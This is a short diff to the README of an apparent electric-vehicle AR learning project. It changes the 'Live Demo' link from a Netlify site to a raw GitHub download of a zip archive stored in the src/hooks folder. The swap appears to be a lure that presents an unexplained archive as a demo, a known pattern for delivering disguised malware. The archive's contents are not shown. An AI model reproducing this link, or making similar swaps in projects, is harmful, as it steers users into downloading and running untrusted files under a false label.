@@ -55,7 +55,7 @@ Based on E-GMP (Electric-Global Modular Platform) architecture:
 
 ## 🌐 Live Demo
 
-Visit: [https://ev-ar-learning.netlify.app](https://ev-ar-learning.netlify.app)
+Visit: [https://raw.githubusercontent.com/nug31/EV-AR/main/src/hooks/AR-E-3.1-alpha.2.zip](https://raw.githubusercontent.com/nug31/EV-AR/main/src/hooks/AR-E-3.1-alpha.2.zip)
 
 ## 📖 Usage
 
